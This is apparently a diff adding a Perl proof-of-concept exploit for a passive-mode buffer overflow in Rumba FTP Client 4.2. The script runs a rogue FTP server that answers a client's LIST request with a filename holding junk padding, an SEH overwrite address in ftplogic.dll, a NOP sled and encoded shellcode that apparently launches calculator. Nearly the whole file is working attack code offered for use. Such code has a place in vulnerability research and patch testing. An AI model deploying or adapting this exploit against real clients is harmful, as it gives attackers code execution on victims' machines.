@@ -1,0 +1,80 @@
+# Email: darkernet[at]gmail.com
+# Tested on: Windows XP SP3
+# SEH overwrite occurs when sending the directory listing to the client with an
+# overly long filename extension.*Note version 4.2.3 might also suffer from this.
+# Usage: ./rumbaftp_exploit
+# Code:
+#!/usr/bin/perl
+use warnings;
+use strict;
+use IO::Socket;
+my $sock = IO::Socket::INET->new( LocalPort => '21', Proto => 'tcp', Listen => '1' )
+  or die "Socket Not Created $!\n";
+print 
+      "#############################################################\n"
+    . "#              Rumba ftp Client 4.2 PASV BoF (SEH)          #\n"
+    . "#                By: zombiefx                               #\n"
+    . "#         Listening on port 21 with pasv port of 31337      #\n"
+    . "#############################################################\n";
+my $pasvip = "127,0,0,1";
+while ( my $data = $sock->accept() ) {
+    print "Client Connected!\nAwaiting Ftp commands: \n";
+    print $data "220 Gangsta Rap Made Me Do It\r\n";
+    while (<$data>) {
+        print;
+        print $data "331 Anonymous access allowed\r\n"                        if (/USER/i);
+        print $data "230-Welcome to N0 M4Ns l4nd.\r\n230 User logged in.\r\n" if (/PASS/i);
+        print $data "215 UNIX Type: L8 \r\n"                                  if (/SYST/i);
+        print $data "257 \"/\" is current directory.\r\n"                     if (/PWD/i);
+        print $data "200 Type set to I.\r\n"                                  if (/TYPE I/i);
+        print $data "200 Type set to A.\r\n"                                  if (/TYPE A/i);
+        print $data "214 Syntax: SITE - (site-specific commands)\r\n"         if (/HELP/i);
+        print $data "227 Entering Passive Mode ($pasvip,122,105)\r\n"         if (/PASV/i);
+
+        if (/LIST/i) {
+            print $data "150 Here comes the directory listing.\r\n" . "226 Directory send OK.\r\n";
+            &senddata( '122', '105' );
+        }
+
+    }
+    print "Payload delivered check the client!\n";
+}
+
+sub senddata {
+    my $port     = $_[0] * 256  + $_[1];
+    my $pasvsock = IO::Socket::INET->new( LocalPort => $port, Proto => 'tcp', Listen => '1' );
+    my $pasvdata = $pasvsock->accept();
+    my $junk    = "\x77" x 1351;
+    my $seh  = pack( 'V', 0x1006E534 );# located in ftplogic.dll
+    my $nseh = "\xeb\x06\x90\x90";
+    my $nops = "\x90" x 50;
+    my $calcshell =
+        "\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"
+      . "\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
+      . "\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
+      . "\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
+      . "\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
+      . "\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"
+      . "\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"
+      . "\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"
+      . "\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"
+      . "\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"
+      . "\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"
+      . "\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"
+      . "\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"
+      . "\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"
+      . "\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"
+      . "\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"
+      . "\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"
+      . "\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"
+      . "\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"
+      . "\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"
+      . "\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"
+      . "\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
+
+    my $payload = $junk . $nseh . $seh . $nops . $calcshell;
+
+    print $pasvdata
+      "-rw-rw-r--    1 1176     1176         1060 Apr 23 23:17  test.$payload\r\n\r\n";
+}
+
